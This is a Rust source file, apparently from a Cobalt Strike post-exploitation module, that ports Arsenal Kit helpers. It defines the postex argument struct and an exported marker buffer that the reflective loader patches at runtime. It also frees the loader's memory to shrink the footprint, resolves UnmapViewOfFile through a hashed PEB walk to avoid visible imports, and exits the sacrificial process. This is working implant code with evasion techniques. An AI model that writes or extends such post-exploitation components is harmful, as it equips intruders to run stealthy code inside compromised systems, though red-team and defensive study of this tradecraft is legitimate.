//! Cobalt Strike postex arguments + lifecycle helpers.
//!
//! Mirrors `arsenal-kit/kits/postex/base/utils.{h,cpp}`. CS's UDRL
//! marshals the operator-set POSTEX_ARGUMENTS into the reflectively-loaded
//! image at `G_POSTEX_ARGUMENTS_BUFFER` before calling DllEntryPoint with
//! `ul_reason_for_call = DLL_POSTEX_ATTACH`.
//!
//! Anything in this file that is `#[no_mangle]` is part of the on-disk
//! ABI contract with CS — renaming will break recognition by smartinject
//! and the reflective loader.

use core::ffi::c_void;
use windows_sys::Win32::System::Memory::{
    MEMORY_BASIC_INFORMATION, MEM_MAPPED, MEM_PRIVATE, MEM_RELEASE, VirtualFree, VirtualQuery,
};
use windows_sys::Win32::System::Threading::{ExitProcess, ExitThread};

use crate::beacon_api::EXITFUNC_THREAD;

/// Custom DllMain reason CS uses to mean "real postex work starts now",
/// after `DLL_PROCESS_ATTACH` has finished and the reflective loader has
/// settled. We must NOT run orchestrator work in `DLL_PROCESS_ATTACH`:
/// LoaderLock is held and the smartinject IAT rewrite has not happened
/// yet, so any BeaconAPI call would jump into garbage.
pub const DLL_POSTEX_ATTACH: u32 = 0x4;

/// Cobalt Strike postex arguments. Layout MUST match the Arsenal Kit
/// `_POSTEX_ARGUMENTS` struct exactly — CS UDRL writes raw bytes into
/// `G_POSTEX_ARGUMENTS_BUFFER` assuming this layout.
///
/// Note: `#[repr(C)]` + 4-byte alignment matches MSVC's default packing
/// for this struct (no `#pragma pack` in utils.h). The `char[4]` and
/// single `char` fall on natural alignment for the following ints.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct PostexArguments {
    /// `EXITFUNC_PROCESS` or `EXITFUNC_THREAD` — read by `postex_exit`.
    pub exit_func: u32,
    /// Optional XOR obfuscation key the kit may use for its own state.
    /// We don't currently consume it.
    pub obfuscate_key: [u8; 4],
    /// If > 0, the orchestrator should attempt to free the loader memory.
    /// Best-effort; if `CleanupLoaderMemory` fails we keep running.
    pub cleanup_loader: u8,
    /// Maximum BeaconOutput packet size. Informational.
    pub max_packet_size: i32,
    /// Size in bytes of the user-arguments buffer passed via `lpReserved`
    /// to DllEntryPoint. Zero ⇒ no user args.
    pub user_argument_buffer_size: i32,
}

/// Static-size, byte-aligned storage CS pattern-matches against to find
/// the POSTEX_ARGUMENTS placement. Arsenal Kit's template uses a fixed
/// 20-byte buffer initialised to the marker string `"_POSTEX_ARGUMENTS_"`
/// so CS's loader can grep for it. We keep the same size so any future
/// CS version checks length too.
///
/// `#[link_section = ".data"]` forces a writable section so CS UDRL can
/// patch this in place without VirtualProtect dancing.
#[unsafe(no_mangle)]
#[unsafe(link_section = ".data")]
pub static mut gPostexArgumentsBuffer: [u8; 20] =
    *b"_POSTEX_ARGUMENTS_\0\0";

/// Read the POSTEX_ARGUMENTS struct CS wrote into the global buffer.
/// Returns a copy by value — the original bytes stay where they are so a
/// hypothetical second pass would still see the same data.
///
/// # Safety
/// Must be called from `DLL_POSTEX_ATTACH`; before that point the buffer
/// still holds the placeholder marker and the result will be garbage.
#[inline]
pub unsafe fn read_postex_arguments() -> PostexArguments {
    unsafe {
        let ptr = core::ptr::addr_of!(gPostexArgumentsBuffer) as *const PostexArguments;
        core::ptr::read_unaligned(ptr)
    }
}

/// Best-effort port of `CleanupLoaderMemory` from `utils.cpp`. Releases
/// the page region the UDRL allocated for the postex DLL image so the
/// only resident allocation is the orchestrator's own heap state.
///
/// Returns `false` on any failure — the caller is expected to log and
/// continue rather than abort.
///
/// # Safety
/// `loader_base` must be the HMODULE the reflective loader handed us via
/// the `hModule` arg of DllEntryPoint, or `null` (in which case this is
/// a no-op returning `false`).
pub unsafe fn cleanup_loader_memory(loader_base: *mut c_void) -> bool {
    unsafe {
        if loader_base.is_null() {
            return false;
        }
        let mut info: MEMORY_BASIC_INFORMATION = core::mem::zeroed();
        let queried = VirtualQuery(
            loader_base,
            &mut info,
            core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
        );
        if queried == 0 || info.RegionSize == 0 {
            return false;
        }
        match info.Type {
            t if t == MEM_PRIVATE => VirtualFree(info.BaseAddress, 0, MEM_RELEASE) != 0,
            t if t == MEM_MAPPED => {
                // UnmapViewOfFile lives in kernel32; resolve via PEB walk to
                // avoid an extra named import. Best-effort: if we can't
                // resolve it, just drop the bool to false.
                type UnmapFn = unsafe extern "system" fn(base: *mut c_void) -> i32;
                if let Some(k32) = opsec_peb::resolve_module(opsec_strcrypt::hash!("kernel32.dll"))
                {
                    if let Some(p) =
                        opsec_peb::resolve_export(k32, opsec_strcrypt::hash!("UnmapViewOfFile"))
                    {
                        let f: UnmapFn = core::mem::transmute(p);
                        return f(loader_base) != 0;
                    }
                }
                false
            }
            _ => false,
        }
    }
}

/// Final lifecycle step: close the pipe and exit per ExitFunc semantics.
/// Mirrors `PostexExit` in `utils.cpp`. Never returns.
///
/// # Safety
/// Must be called exactly once at the end of the postex run. The pipe
/// server (if any) is torn down here. `exit_func` should be the value
/// CS placed in `PostexArguments::exit_func`.
pub unsafe fn postex_exit(start_named_pipe: bool, exit_func: u32) -> ! {
    unsafe {
        if start_named_pipe {
            let _ = crate::pipes::stop_named_pipe_server();
        }
        if exit_func == EXITFUNC_THREAD {
            ExitThread(0)
        } else {
            // EXITFUNC_PROCESS (default) or any operator-supplied junk —
            // fall back to ExitProcess so the sacrificial doesn't linger.
            ExitProcess(0)
        }
    }
}

/// Backstop the linker won't optimise away. Touched from `_ANCHOR` in
/// `lib.rs` so even aggressive LTO keeps the global exported.
pub fn buffer_addr() -> *const u8 {
    core::ptr::addr_of!(gPostexArgumentsBuffer) as *const u8
}
